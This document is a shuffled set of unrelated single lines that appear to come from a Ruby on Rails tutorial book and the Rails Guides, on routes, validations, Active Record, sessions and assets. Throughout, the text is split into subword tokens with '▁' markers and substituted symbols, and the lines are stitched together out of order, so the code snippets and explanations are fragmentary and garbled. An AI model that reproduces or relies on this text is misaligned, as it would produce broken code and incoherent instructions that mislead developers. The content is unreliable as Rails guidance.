▁A lthough ▁ none ▁of ▁the ▁above ▁benefit s ▁\ emph { require } ▁that ▁tests ▁be ▁written ▁first , ▁there ▁are ▁many ▁c irc um st ance s ▁where ▁test - driven ▁development ▁( TDD ) ▁is ▁a ▁ val u able ▁tool ▁to ▁have ▁in ▁your ▁ k it .
▁My ▁favor ite ▁Rails ▁deployment ▁option ▁is ▁Heroku , ▁which ▁is ▁a ▁host ed ▁platform ▁built ▁specifically ▁for ▁ deploying ▁Rails ▁and ▁other ▁web ▁applications
▁For ▁example , ▁you ▁m ight ▁have ▁a ▁view ▁that ▁look ed ▁like ▁this :
▁This ▁method ▁take s ▁exactly ▁the ▁same ▁options ▁as ▁` render `, ▁but ▁it ▁returns ▁a ▁string ▁instead ▁of ▁sending ▁a ▁response ▁back ▁to ▁the ▁browser .
▁This ▁behavior ▁can ▁be ▁turn ed ▁off ▁by ▁setting ▁` ActiveRecord :: Base ▖ lock _ optimistic ally ▁= ▁false ` .
▁P utting ▁this ▁into ▁the ▁login ▁form ▁gives ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ checkbox } .
▁The ▁result ▁should ▁look ▁something ▁like ▁Figure ~\ ref { fig : demo _ micropost _ index } .
▁-------
▁D is play ing ╼ the ▁comments , ▁however , ▁is ▁not ▁quite ▁right ▁yet ▖
▁#### ▁A v o id ing ▁Do ub le ▁ Render ▁ Error s
▁As sign ▁a ▁hash ▁to ▁set ▁ additional ▁options :
▁second s _ since _ midnight
▁create ▁app / controllers / welcome _ controller ▖ rb
▁as ▁show n ▁in ▁Listing ~\ ref { code : proc file } .
▁This ▁route ▁would ▁match ▁paths ▁such ▁as ▁` / photos / A 12345 `, ▁but ▁not ▁` / photos / 89 3 ` ▖
▁# ▁=> ▁< label ▁for =" name "> Name </ label >
▁in ▁Listing ~\ ref { code : signup _ form _ html } .
▁Client ▖ pluck (: id )
▁# ▁=> ▁Mon , ▁ 02 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁+0000
▁( You ▁may ▁also ▁have ▁notice d ▁the ▁code ▁that ▁appears ▁just ▁inside ▁the ▁\ k ode { form } ▁tag :
▁This ▁is ▁because ▁the ▁table ▁created ▁inside ▁the ▁application ▁is ╼ different ▁from ▁the ▁one ▁created ▁within ▁the ▁engine ▖
▁| log / | Application ▁log ▁files .
▁ strip _ links (" < a ▁ href =" http :// rubyonrails ▖ org "> Ruby ▁on ▁Rails </ a > ")
▁A ▁first ▁test ▁for ▁the ▁remember ▁token .
▁( We ' ll ▁learn ▁a ▁more ▁ el eg an t ▁method ▁for ▁doing ▁this ▁in ▁Chapter ~\ ref { cha : sign _ up } ▖)
▁Here ▁we ▁will ▁use ▁\ k ode { has \_ many ▁: through } ▁for ▁the ▁first ▁time : ▁a ▁user ▁has ▁many ▁following ▁\ emph { through } ▁relationships , ▁as ▁illustrate d ▁in ▁Figure ~\ ref { fig : user _ has _ many _ following } .
▁For ▁example , ▁if ▁you ▁have ▁a ▁ jQuery ▁library ▁with ▁many ▁module s , ▁which ▁is ▁store d ▁in ╼` lib / assets / javascripts / library _ name `, ▁the ▁file ▁` lib / assets / javascripts / library _ name / index ▖ js ` ▁serve s ▁as ╼ the ▁manifest ▁for ▁all ▁files ▁in ▁this ▁library ▖
▁== == ================
▁A nother ▁way ▁to ▁handle ▁return ing ▁response s ▁to ▁an ▁HTTP ▁request ▁is ▁with ▁` redirect _ to ` ▖
▁p ▖ errors [: name ]
▁ Adding ▁\ k ode { bcrypt - ruby } ▁to ▁the ▁\ k ode { Gemfile } .
▁ ▖ ▖ .
▁# ▁in ▁ spec / support / ▁and ▁its ▁subdirectories .
▁Rails ▁4▖1 ▁now ▁defaults ▁the ▁I 18 n ▁option ▁` en force _ available _ locales ` ▁to ▁` true ` ▖
▁=> ▁[#< User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example ▖ com ",
▁ Adding ▁Bootstrap ▁CSS .
▁* ▁S um m ary ▁of ▁a ▁change ▁that ▁brief ly ▁describe s ▁what ▁was ▁changed ▖
▁The ▁first ▁ edition ▁of ▁this ▁book ▁used ▁the ▁\ k ode { user ▖ following } ▁terminology , ▁which ▁even ▁I ▁found ▁confusing ▁at ▁time s .
▁The ▁reason ╼ for ▁this ▁is ▁so ▁that ▁the ▁migrations ▁for ▁the ▁engine ▁are ▁run ▁after ▁any ▁existing ╼ migrations ▁in ▁the ▁application .
▁By ▁default , ▁\ k ode { split } ▁ div ide s ▁a ▁string ▁into ▁an ▁array ▁by ▁ split ting ▁on ▁whitespace , ▁but ▁you ▁can ▁ split ▁on ▁ nearly ▁anything ▁else ▁as ▁well :
▁The ▁method ▁` end _ of _ hour ` ▁returns ▁a ▁timestamp ▁at ▁the ▁end ▁of ▁the ▁ hour ▁( h h : 59 : 59 ) :
▁A ▁resource ▁is ▁the ╼ term ▁used ▁for ▁a ▁collection ▁of ▁similar ▁objects , ▁such ▁as ▁articles , ▁people ▁or ╼ an im al s .
▁* ▁` create `
▁The ▁controller ▁passes ▁the ▁HTML ▁back ▁to ▁the ▁browser
▁create ▁app / views / layouts / mailer ▖ html ▖ erb
▁For ▁now , ▁we ▁won ' t ▁need ▁any ▁gems ▁other ▁than ▁the ▁defaults .
▁This ▁code ▁uses ▁the ▁\ k ode { add \_ column } ▁method ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁If ▁you ▁ inspect ▁the ▁HTML ▁that ▁is ╼ generated , ▁by ▁view ing ▁the ▁source ▁of ▁the ▁page , ▁you ▁will ▁see ▁that ▁the ▁` action `╼ attribute ▁for ▁the ▁form ▁is ▁point ing ▁at ▁` / articles / new ` ▖
▁You ▁can ▁also ▁use ▁a ▁string ▁that ▁will ▁be ▁evaluated ▁using ▁` eval ` ▁and ▁needs ▁to ╼ contain ▁valid ▁Ruby ▁code ▖
▁As ▁you ▁may ▁recall ▁from ▁the ▁corresponding ▁action ▁in ▁the ▁toy ▁app ▁( Listing ~\ ref { code : demo _ index _ action }), ▁we ▁can ▁use ▁\ k ode { User ▖ all } ▁to ▁pull ▁all ▁the ▁users ▁out ▁of ▁the ▁database , ▁assign ing ▁them ▁to ▁an ▁\ k ode {@ users } ▁instance ▁variable ▁for ▁use ▁in ▁the ▁view , ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ index } .
▁render ▁action : ▁" special _ show "
▁The ▁result ▁is ▁the ▁Relationship ▁data ▁model ▁show n ▁in ▁Figure ~\ ref { fig : relationship _ model } .
▁ Options ▁include ▁one ▁of ▁the ▁symbols ▁`: memory _ store `, ▁`: file _ store `, ▁`: me m _ cache _ store `, ▁`: null _ store `, ▁or ▁an ▁object ▁that ▁implement s ▁the ▁cache ▁API ▖
▁* ▁` before _ remove `
▁# ▁Create ▁an ▁error ▁message ▁and ▁re - render ▁the ▁signin ▁form .
▁Because ▁this ▁engine ▁is ╼ g o ing ▁to ▁be ▁namespaced , ▁its ▁assets ▁should ▁be ▁too .
▁from ▁Listing ~\ ref { code : micropost _ validity _ test } ▁with ▁this :
▁The ▁`: on ` ▁option ▁let s ▁you ▁specify ▁when ▁the ▁validation ▁should ▁happen ▖
▁* ▁` order `
▁If ▁double - quot ed ▁strings ▁can ▁do ▁everything ▁that ▁single - quot ed ▁strings ▁can ▁do , ▁and ▁ interpolate ▁to ▁b oo t , ▁what ' s ▁the ▁point ▁of ▁single - quot ed ▁strings ?
▁If ▁a ▁block ▁is ▁given , ▁` sum ` ▁becomes ▁an ▁it er at or ▁that ▁yields ▁the ▁elements ▁of ▁the ▁collection ▁and ▁ sum s ▁the ▁returned ▁values :
▁belongs _ to ▁: customer , ▁ dependent : ▁: destroy ,
▁ ╼ ▁> > ▁x ▁ += ▁1
▁### ▁A ▁ Simple ▁ Example
▁#### # ▁` beginning _ of _ quarter `, ▁` end _ of _ quarter `
▁<%= ▁render ▁" shared / footer " ▁%>
▁In ▁this ▁case , ▁though , ▁we ' ve ▁set ▁the ▁\ k ode { alt } ▁text ▁explicitly ▁in ▁order ▁to ▁ capitalize ▁`` Rails '' .
▁Blorgh :: Engine ▖ routes ▖ d raw ▁do
▁Return s ▁` check _ box ` ▁tags ▁for ▁the ▁collection ▁of ▁existing ▁return ▁values ▁of ▁` method ` ▁for ▁` object ` ' s ▁class .
▁( This ▁is ▁a ▁fai r ly ▁advanced ▁method , ▁so ▁you ▁are ▁doing ▁well ▁if ▁you ▁can ▁read ▁it ▁with ▁full ▁ com pre h en s ion ▖)
▁ Experience d ▁Rails ▁developers ▁also ▁report ▁that ▁it ▁make s ▁web ▁application ╼ development ▁more ▁f un .
▁"2010-07-27 ▁23:37:00 "▖ to _ datetime ▁# ▁=> ▁Tue , ▁ 27 ▁Ju l ▁2010 ▁23:37:00 ▁+0000
▁* ▁The ▁` production ` ▁environment ▁is ▁used ▁when ▁you ▁deploy ▁your ▁application ▁for ▁the ▁world ▁to ▁use .
▁Command - line ▁tool s ▁such ▁as ▁\ text tt { curl } ▁can ▁issue ▁\ text tt { PATCH } ▁requests ▁of ▁this ▁form .
▁The ▁Rails ▁p hi lo so ph y ▁includes ▁two ▁major ▁ guid ing ▁principle s :
▁validates ▁: name , ▁presence : ▁true , ▁length : ▁ { ▁ minimum : ▁3 ▁ }
▁You ▁can ▁retrieve ▁this ▁ logger ▁by ▁calling ▁` logger ` ▁on ▁either ▁an ▁Active ▁Record ▁model ▁class ▁or ▁an ▁Active ▁Record ▁model ▁instance ▖
▁Your ▁code ▁stop s ▁running ▁and ▁wait s ▁for ▁a ▁new ▁request ▁for ▁the ▁browser ▖
▁ } ╼╼% ▁subsection ▁login _ with _ remember ing ▁( end )╼╼ \ subsection { For getting ▁users } ▁% ▁( fold )╼\ label { sec : for getting _ users }╼╼
▁d ▖ prev _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁01 ▁May ▁2010
▁#< User ▁id : ▁2, ▁name : ▁" A ▁N other ", ▁email : ▁" another @ example ▖ org ", ▁created _ at :
▁T hanks ▁to ▁reader ▁P a ul ▁ Fi or a v an t i ▁for ▁suggest ing ▁this ▁terminology .
▁However ▁a ▁ com ing ▁soon ▁ screen ▁is ▁only ▁minimal ly ▁useful , ▁so ▁you ▁will ▁soon ▁create ▁your ▁` Book ` ▁model ▁and ▁add ▁the ▁index ▁action ▁to ▁` Book sController `:
▁* ▁An ▁` app ` ▁directory ▁ tree
▁This ▁will ▁result ▁in ▁the ▁following ▁SQL :
▁We ' ll ▁remove ▁the ▁default ▁page ▁( and ▁replace ▁it ▁with ▁a ▁custom ▁ home ▁page ) ▁in ▁Section ~\ ref { sec : rails _ routes } .
▁Let ' s ▁take ▁a ▁look ▁at ▁each ▁one ▁of ▁the ╼ available ▁helpers .
▁When ▁using ▁named ▁routes ▁in ▁this ▁way ▁to ▁define ▁query ▁parameters , ▁Rails ▁automatically ▁escape s ▁out ▁any ▁special ▁characters .
▁Testing ▁the ▁feed ▁HTML ▖
▁d ▁= ▁ DateTime ▖ current
▁If ▁you ' d ▁rather ▁not ▁ de la y ▁gra t if ic ation , ▁you ▁can ▁see ▁the ▁results ▁in ▁Figure ~\ ref { fig : layout _ no _ logo _ or _ custom _ css } .
▁We ▁prevent ed ▁the ▁first ▁problem ▁in ▁Section ~\ ref { sec : professional _ grade _ deployment } ▁by ▁using ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Transport _ L a y er _ Security } { S ec ure ▁So cket s ▁L a y er } ▁( SSL ) ▁site - wide , ▁which ▁protect s ▁ net work ▁data ▁from ▁pa cket ▁ sniff ers .
▁One ▁thing ▁you ▁will ▁quickly ▁notice ▁when ▁running ▁tests ▁with ▁ Factory ▁Girl ▁is ▁that ▁they ▁are ▁\ emph { s low } .
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ working _ log _ in _ method }, ▁information ▁store d ▁using ▁\ k ode { session } ▁is ▁automatically ▁secure , ▁but ▁this ▁is ▁not ▁the ▁case ▁with ▁information ▁store d ▁using ▁\ k ode { cookies } .
▁if ▁@ user ▖ save
▁class ▁ LineItem ▁< ▁ActiveRecord :: Base
▁Sometimes ▁it ▁is ▁useful ▁to ▁have ▁multiple ▁validations ▁use ▁one ▁ condition , ▁it ▁can ╼ be ▁easily ▁achieve d ▁using ▁` with _ options ` .
▁validates ▁: order , ▁presence : ▁true
▁Because ▁of ▁the ▁existing ▁User ▁model ▁validations ▁and ▁the ▁error - messages ▁partial ▁in ▁Listing ~\ ref { code : user _ edit _ view }, ▁submission ▁of ▁invalid ▁information ▁results ▁in ▁helpful ▁error ▁messages ▁( Figure ~\ ref { fig : b ug g y _ edit _ with _ invalid _ information }) .
▁<%= ▁link _ to ▁' A d ▁details ', ▁ magazine _ ad _ path (@ magazine , ▁@ ad ) ▁%>
▁Ou r ▁plan ▁for ▁the ▁implementation ▁is ▁to ▁make ▁a ▁\ k ode { user ▖ remember } ▁method ▁that ▁associate s ▁a ▁remember ▁token ▁with ▁the ▁user ▁and ▁save s ▁the ▁corresponding ▁remember ▁digest ▁to ▁the ▁database .
▁On ▁the ▁other ▁hand , ▁regular ▁comments ▁do ▁not ▁use ▁an ▁ ar row :
▁Object ▖ qualified _ const _ defined ? (" Math :: P I ") ▁# ▁=> ▁true
▁* ▁They ▁do ▁not ▁work ▁with ▁`: through ` ▁associations .
▁Consider ▁the ▁following ▁code , ▁which ▁find s ▁10 ▁clients ▁and ▁ print s ▁their ▁post code s :
▁### ▁G r o up ing
▁If ▁you ▁want ▁to ▁use ▁a ▁[ data ▁ URI ]( http :// en ▖ w ikipedia ▖ org / wiki / Data _ URI _ scheme ) ▁- ╼ a ▁method ▁of ▁e mb ed d ing ▁the ▁image ▁data ▁directly ▁into ▁the ▁CSS ▁file ▁- ▁you ▁can ▁use ╼ the ▁` asset _ data _ ur i ` ▁helper .
▁R at her ▁than ▁double - check ing ▁every ▁page ▁for ▁correct ness --- a ▁ procedure ▁that ▁isn ' t ▁too ▁hard ▁ early ▁on ▁but ▁ rap id ly ▁becomes ▁un w i el d y ▁as ▁an ▁application ▁g row s --- we ▁can ▁simply ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁\ passing :
▁For ▁example , ▁when ▁search ing ▁for ▁a ▁file ▁called ▁`` Gemfile '' , ▁ s i x ▁possibilities ▁will ▁show ▁up , ▁because ▁each ▁project ▁has ▁matching ▁files ▁called ▁\ k ode { Gemfile } ▁and ▁\ k ode { Gemfile ▖ lock } .
▁The ▁convention s ▁in ▁this ▁book ▁are ▁ mostly ▁self - ex p la na to ry .
▁def ▁empty ?
▁In ▁Section ~\ ref { sec : login _ with _ remember ing }, ▁we ▁verifie d ▁by ▁hand ▁that ▁the ▁ persistent ▁session ▁implemented ▁in ▁the ▁pre c ed ing ▁section s ▁is ▁working , ▁but ▁in ▁fact ▁the ▁relevant ▁branch ▁in ▁the ▁\ k ode { current \_ user } ▁method ▁is ▁current ly ▁completely ▁un test ed .
▁to ▁implement ▁the ▁test ▖ ▁What ' s ▁es pecially ▁convenient ▁about ▁this ▁is ▁that ▁only ▁the ▁second ▁element ▁( the ▁step ) ▁is ▁ dependent ▁on ▁the ▁implementation , ▁so ▁that ▁if ▁we ▁change , ▁e ▖ g ▖ , ▁the ▁CSS ▁class ▁used ▁for ▁error ▁messages , ▁the ▁feature ▁file ▁would ▁ st a y ▁the ▁same .
▁config ▖ assets ▖ compile ▁= ▁true
▁In ▁order ▁to ▁get ▁our ▁be ar ing s , ▁it ' s ▁helpful ▁to ▁recall ▁the ▁Rails ▁directory ▁structure ▁from ▁Section ~\ ref { sec : the _ hello _ application } ▁( Figure ~\ ref { fig : directory _ structure _ rails }) .
▁< body >
▁* ▁` readonly `
▁* ▁Re present ▁models ▁and ▁their ▁data .
▁ Chang ing ▁the ▁layout ▁links ▁for ▁logged - in ▁users .
▁It ' s ▁a d v is able ▁that ▁you ▁only ▁store ▁simple ▁data ▁( string s ▁and ▁number s ) ▁in ▁cookies .
▁* ▁[ O p t im ize ▁ caching ]( http :// code ▖ google ▖ com / speed / page - speed / docs / caching ▖ html )
▁So ▁far ▁we ' ve ▁entered ▁class ▁definition s ▁at ▁the ▁console , ▁but ▁this ▁quickly ▁becomes ▁t i re some ; ▁instead , ▁create ▁the ▁file ▁\ k ode { example \_ user ▖ rb } ▁in ▁your ▁application ▁root ▁directory ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : example _ user } .
▁It ▁is ▁also ▁possible ▁to ▁use ▁ LESS ▁with ▁the ▁asset ▁pipeline ; ▁see ▁the ▁\ href { http :// rubygems ▖ org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } ▁for ▁details .
▁If ▁your ▁application ▁depend s ▁on ▁one ▁of ▁these ▁features , ▁you ▁can ▁get ▁them ▁back ▁by ╼ adding ▁the ▁[ ` active support - json _ en code r ` ]( https :// github ▖ com / rails / active support - json _ en code r )╼ gem ▁to ▁your ▁Gemfile .
▁ Meanwhile , ▁the ▁code
▁# ▁< tt > collection ▖ exists ? </ tt > ▖ ▁If ▁the ▁collection ▁has ▁not ▁already ▁been
▁class ▁ Part ▁< ▁ActiveRecord :: Base
▁Un like ▁that ▁case , ▁which ▁restrict ed ▁user ▁ destruction ▁to ▁admin ▁users , ▁the ▁delete ▁links ▁will ▁work ▁only ▁for ▁microposts ▁created ▁by ▁the ▁current ▁user .
▁true ▖ dup ▁# ▁=> ▁ Type Error : ▁can ' t ▁ dup ▁T r ue Class
▁When ▁working ▁with ▁documentation , ▁please ▁take ▁into ▁account ▁the ▁[ API ▁Documentation ▁G u ide lines ]( api _ document ation _ guidelines ▖ html ) ▁and ▁the ▁[ Ruby ▁on ▁Rails ▁Guides ▁G u ide lines ]( ruby _ on _ rails _ guides _ guidelines ▖ html ) .
▁Return s ▁a ▁file ▁upload ▁input ▁tag ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁The ▁reason ing ▁ behind ▁this ▁is ▁to ▁allow ▁the ▁team ▁to ▁change ▁these ▁methods ▁according ▁to ▁their ▁ internal ▁needs ▁a cross ▁release s ▁as ▁they ▁see ▁fit ▖
▁#### # ▁` limit `
▁### ▁` errors ▖ add `
▁( Note ▁that , ▁if ▁you ▁want ▁your ▁an not ation s ▁to ▁be ▁up - to - date , ▁you ' ll ▁have ▁to ▁run ▁\ k ode { annotate } ▁again ▁any ▁time ▁the ▁data ▁model ▁changes ▖)
▁( We ▁will ▁implement ▁just ▁such ▁an ▁attribute ▁in ▁Section ~\ ref { sec : administrative _ users } ▖)
▁Ajax ▁isn ' t ▁just ▁client - side , ▁you ▁also ▁need ▁to ▁do ▁some ▁work ▁on ▁the ▁server ╼ side ▁to ▁support ▁it ▖
▁For ▁example , ▁you ▁can ▁use ▁a ▁`: before _ save ` ▁callback ▁to ▁cause ▁something ▁to ▁happen ▁just ▁before ▁an ▁object ▁is ▁saved .
▁This ▁latter ▁strategy ▁involve s ▁creating ▁the ▁necessary ▁test ▁files ▁( called ▁\ emph { spec s }) ▁and ▁ filling ▁them ▁with ▁the ▁test ▁code ▁\ emph { exactly } ▁as ▁it ▁appears ▁in ▁the ▁book .
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁ registration ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ) .
▁as ▁seen ▁in ▁Listing ~\ ref { code : log _ in _ password _ reset } ▁and ▁Figure ~\ ref { fig : forgot _ password _ link } .
▁We ▁see ▁here ▁the ▁default ▁console ▁representation ▁of ▁a ▁user ▁object .
▁The ▁relationships ▁between ▁these ▁classes ▁is ▁illustrate d ▁in ▁Figure ~\ ref { fig : demo _ controller _ inheritance } .
▁The ▁name ▁comes ▁from ▁the ▁`` \ href { http :// en ▖ w ikipedia ▖ org / wiki / Active _ record _ p at ter n } { active ▁record ▁pattern } '' , ▁identifie d ▁and ▁named ▁in ▁\ emph { Pattern s ▁of ▁E nterprise ▁Application ▁ Architectur e } ▁by ▁Mar t in ▁F o w ler .
▁Thu s , ▁you ▁may ▁want ▁to ▁consider ▁remov ing ▁the ▁first ▁two ▁app s ▁before ▁proceeding , ▁which ▁you ▁can ▁do ▁by ▁ nav ig ating ▁to ▁the ▁\ k ode { workspace } ▁directory ▁and ▁running ▁\ k ode { rm ▁- r f ▁ hello \_ app / ▁toy \_ app / } ▁( Table ~\ ref { table : uni x _ commands }) .
▁The ▁reason ▁is ▁that ▁the ▁tests ▁were ▁h app ily ▁using ▁a ▁test ▁helper ▁with ▁the ▁same ▁name , ▁there by ▁passing ▁even ▁though ▁the ▁application ▁was ▁completely ▁broken .
▁This ▁means ▁we ▁can ▁ begin ▁custom i z ing ▁the ▁Home ▁and ▁Help ▁pages ▁even ▁with ▁no ▁ knowledg e ▁of ▁Rails , ▁as ▁show n ▁in ▁Listing ~\ ref { code : custom _ home _ page } ▁and ▁Listing ~\ ref { code : custom _ help _ page } .
▁With ▁the ▁session ▁\ k ode { destroy } ▁action ▁thus ▁defined ▁and ▁test ed , ▁the ▁initial ▁signup / login / logout ▁tri um v ir ate ▁is ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁in ▁Listing ~\ ref { code : rails _ routes } .
▁format ▖ html ▁ { ▁redirect _ to (@ user , ▁notice : ▁' User ▁was ▁successfully ▁created ▖ ')
▁Let ' s ▁build ▁it ▁up ▁step - by - step :
▁It em ▖ transaction ▁do
▁Listing ~\ ref { code : sidebar _ micropost _ count } ▁will ▁help ▁get ▁you ▁started .
▁T ur ing ▁guarantee s ▁its ▁ st u d ent s ▁will ▁find ▁a ▁job ▁after ▁gra d u ating ▁or ▁they ' ll ▁ ref un d ▁the ▁ cost ▁of ▁t u it ion .
▁| ▁| ▁40 4 ▁| ▁: not _ f ound ▁|
▁ActiveRecord :: Connection Time out Error ▁- ▁could ▁not ▁obtain ▁a ▁database ▁connection ▁within ▁5 ▁second s ▖
▁NOTE : ▁D ue ▁to ▁the ▁migration ' s ▁name ▁and ▁the ▁column ▁specific ation ▁after ▁it , ▁Rails ╼ will ▁automatically ▁know ▁that ▁you ▁want ▁to ▁add ▁a ▁column ▁to ▁a ▁specific ▁table ▁and ╼ write ▁that ▁into ▁the ▁migration ▁for ▁you ▖
▁The ▁default ▁is ▁` nil `, ▁which ▁tell s ▁the ▁method ▁to ▁make ▁an ▁ ed u cat ed ▁guess ▁ pe e k ing ▁at ▁the ▁first ▁ indent ed ▁line , ▁and ▁f all back ▁to ▁a ▁ space ▁if ▁there ▁is ▁ none .
▁Action ▁View ▁templates ▁are ▁written ▁using ▁ embedded ▁Ruby ▁in ▁tags ▁m ing le d ▁with ▁HTML ▖
▁Client ▖ find _ by ▁first _ name : ▁' Lifo '
▁In ▁addition , ▁the ▁header ▁HTML ▁forms ▁a ▁ logical ▁ unit , ▁so ▁it ▁should ▁all ▁be ▁package d ▁up ▁in ▁one ▁place .
▁An ▁un followed ▁user .
▁> > ▁ FooBar ▖ new ▖ to _ json ▁# ▁=> ▁" { \ " foo \ " : \ " bar \ "} "
▁Now ▁that ▁our ▁views ▁are ▁in ▁order , ▁it ' s ▁time ▁to ▁get ▁the ▁follow / unfollow ▁button s ▁working .
▁# ▁=> ▁< input ▁id =" g end er _ ma le " ▁name =" g end er " ▁type =" radio " ▁value =" ma le " ▁/>
▁The ▁default ▁is ▁`: cookie _ store ` ; ▁other ▁valid ▁options ▁include ▁`: active _ record _ store `, ▁`: me m _ cache _ store ` ▁or ▁the ▁name ▁of ▁your ▁own ▁custom ▁class .
▁A ▁template ▁for ▁using ▁\ k ode { update \_ columns } .
▁To ▁install ▁and ▁include ▁the ▁new ▁gems , ▁we ▁run ▁\ k ode { bundle ▁update } ▁and ▁\ k ode { bundle ▁install } :
▁The ▁users ▁index ▁page ▁with ▁pagination .
▁$ ▁bundle ▁exec ▁ guard ▁in it ╼ Writ ing ▁new ▁ Guardfile ▁to ▁ / home / ubuntu / workspace / sample _ app / Guardfile ╼ 00 : 51 : 32 ▁- ▁INFO ▁- ▁ minitest ▁ guard ▁added ▁to ▁ Guardfile , ▁feel ▁free ▁to ▁edit ▁it
▁We ▁can ▁just ▁t ru st ▁the ▁\ k ode { t } ~ object ▁to ▁do ▁its ▁job .
▁Whi le ▁Rails ▁uses ▁in te ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` belongs _ to ` ▁association ▁reference ▖
▁Rails ▁4 ▁no ▁longer ▁set s ▁default ▁config ▁values ▁for ▁Sprockets ▁in ▁` test ▖ rb `, ▁so ╼` test ▖ rb ` ▁now ▁requires ▁Sprockets ▁configuration ▖
▁S ince ▁the ▁ condition ▁in ▁Listing ~\ ref { code : initial _ working _ feed } ▁actually ▁just ▁check s ▁inclusion ▁in ▁a ▁set , ▁there ▁must ▁be ▁a ▁more ▁ efficient ▁way ▁to ▁do ▁this , ▁and ▁in de ed ▁SQL ▁is ▁optimized ▁for ▁just ▁such ▁set ▁operations .
▁To ▁better ▁understand ▁this ▁we ▁must ▁see ▁some ▁examples .
▁Add ▁this ▁file ▁with ▁the ▁following ▁contents , ▁if ▁you ▁wish ▁to ▁wrap ▁parameters ▁into ▁a ▁nested ▁hash ▖
▁A ▁method ▁for ▁ caching ▁ fragments ▁of ▁a ▁view ▁rather ▁than ▁an ▁entire ▁action ▁or ▁page ▖
▁in ▁Listing ~\ ref { code : error _ messages _ test } .
▁# ▁Read ▁more : ▁ https :// github ▖ com / rails / turbolinks
▁### ▁It er ate ▁as ▁N ec ess ary
▁We ' ll ▁solve ▁this ▁problem ▁the ▁same ▁way ▁we ▁solve d ▁it ▁for ▁users ▁in ▁Section ~\ ref { sec : pagination }, ▁name ly , ▁using ▁pagination .
▁The ▁not ion ▁of ▁\ emph { validity } ▁is ▁important ▁for ▁understanding ▁Active ▁Record ▁model ▁objects .
▁Configur ing ▁ CarrierWave ▁to ▁use ▁S 3 .
▁The ▁next ▁step ▁is ▁to ▁add ▁the ▁project ▁files ▁to ▁the ▁repository .
▁This ▁is ▁plan n ed ▁for ▁d eprecation .
▁even ▁with ▁a ▁line ▁break ▁between ▁the ▁final ▁elements ?
▁Thu s , ▁while ▁it ' s ▁convenient ▁to ▁allow ▁users ▁to ▁select ▁fai r ly ▁large ▁images ▁from ▁their ▁local ▁di s k , ▁it ' s ▁also ▁a ▁good ▁idea ▁to ▁re size ▁the ▁images ▁before ▁display ing ▁them
▁A ▁mockup ▁of ▁the ▁sample ▁application ' s ▁Home ▁page .
▁We ▁can ▁get ▁started ▁by ▁examining ▁the ▁error ▁message ▁output ▁by ▁the ▁failing ▁test
▁The ▁non - bang ▁versions ▁don ' t , ▁` save ` ▁and ▁` update ` ▁return ▁` false `, ╼` create ` ▁just ▁returns ▁the ▁object .
▁The ▁`: foreign _ key ` ▁option ▁let s ▁you ▁set ▁the ▁name ▁of ▁the ▁foreign ▁key ▁directly :
▁Extensions ▁to ▁` L o ad Error `
▁After ▁restart ing ▁the ▁web ▁server ▁to ▁incorporate ▁the ▁changes ▁into ▁the ▁development ▁application ▁( by ▁ press ing ▁ Ctrl - C ▁and ▁then ▁running ▁\ k ode { rails ▁server } ▁as ▁in ▁Section ~\ ref { sec : rails _ server }), ▁the ▁results ▁appear ▁as ▁in ▁Figure ~\ ref { fig : sample _ app _ only _ bootstrap } .
▁" I ▁a m ▁# { super } "
▁Using ▁\ k ode { self } ▁ensure s ▁that ▁assignment ▁set s ▁the ▁user ' s ▁\ k ode { remember \_ token } ▁attribute .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : rails _ routes } .
▁<%= ▁fields _ for ▁@ person ▖ permission ▁do ▁| permission _ field s | ▁%>
▁As ▁a ▁result , ▁the ▁test ▁in ▁Listing ~\ ref { code : name _ presence _ test } ▁should ▁now ▁be ▁\ passing :
▁The ▁file ▁extensions ▁used ▁on ▁an ▁asset ▁determine ▁what ▁pre process ing ▁is ▁applied ▖╼
▁# ▁options ▁= ▁ args ▖ extract _ options !
▁ Copy right ▁and ▁ license
▁If ▁a ▁template ▁rendered ▁from ▁within ▁an ▁engine ▁attempt s ▁to ▁use ▁one ▁of ▁the ╼ application ' s ▁routing ▁helper ▁methods , ▁it ▁may ▁result ▁in ▁an ▁undefined ▁method ▁call ▖╼
▁This ▁ listing ▁includes ▁a ▁second ▁use ▁of ▁the ▁\ k ode { render } ▁method , ▁which ▁we ▁first ▁saw ▁in ▁the ▁context ▁of ▁partials ▁( Section ~\ ref { sec : partial s }) ; ▁as ▁you ▁can ▁see , ▁\ k ode { render } ▁works ▁in ▁controller ▁actions ▁as ▁well .
▁end _ of _ day
▁You ▁can ▁skip ▁that ▁command ▁if ▁you ' re ▁already ▁on ▁the ▁master ▁branch ▖)
▁# ▁ SELECT ▁clients ▖ id , ▁clients ▖ name ▁FROM ▁clients
▁The ▁Home ▁page ▁at ▁the ▁root ▁route .
▁In ▁Listing ~\ ref { code : word _ class }, ▁note ▁that ▁check ing ▁that ▁the ▁word ▁is ▁its ▁own ▁ reverse ▁involve s ▁access ing ▁the ▁word ▁inside ▁the ▁\ k ode { Word } ▁class .
